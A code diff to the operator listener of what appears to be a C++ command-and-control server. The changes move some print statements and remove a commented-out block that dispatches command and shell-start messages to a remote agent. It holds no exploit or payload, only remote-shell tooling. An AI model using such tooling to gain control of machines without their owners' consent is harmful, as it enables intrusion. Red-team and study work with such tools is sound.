@@ -481,9 +481,9 @@ void server::operator_listener(){
             common::accept_failed(client_fd);
             continue;
         }
+        std::println();
         std::cout << "[+] operator connected" << std::endl;
         // command length will be of 4 bytes so we will accept for bytes first
-
         // receive the packet strcuture
         //                  4 bytes          4 bytes          4 bytes
         //       +-------------+----------------+----------------+
@@ -504,7 +504,6 @@ void server::operator_listener(){
         std::cout << "[+]MESSAGE_TYPE : " << received_packet.message_type << std::endl;
         std::cout << "[+]SESSION_ID : " << received_packet.session_id << std::endl;
         std::cout << "[+]PAYLOAD_LENGTH : " << received_packet.payload_length << std::endl;
-        std::println("\n");
         //receiving payload
         if(received_packet.payload_length > 0){
             std::vector<uint8_t> payload(received_packet.payload_length);
@@ -516,17 +515,8 @@ void server::operator_listener(){
             //deserializing payload
             // payload is still in bytes so we need to deserilize the payload to get human readable data
             received_packet.payload = deserialization_payload(payload.data(), payload.size());
-
-            // Starting Dispatch
             std::cout << "[+]PAYLOAD : " << received_packet.payload << std::endl;
-            // if(received_packet.message_type == MESSAGE_COMMAND ||
-            //     received_packet.message_type == MESSAGE_SHELL_START){
-            //     command_dispatcher(received_packet, client_fd);// automatically passes the address of the packet structure without having to deal with complex pointers and dereferencing
-            // }
-            // else{
-            //     std::cout << "[!]unsupported MESSAGE_TYPE : " << received_packet.message_type << std::endl;
-            //     close(client_fd);
-            // }
+            std::println("\n");
         }
         // dispatch regardless of payload length cuz SHELL_START will not have any payload its just to initiate the shell establishment with the agent
         if(received_packet.message_type == MESSAGE_COMMAND || received_packet.message_type == MESSAGE_SHELL_START){
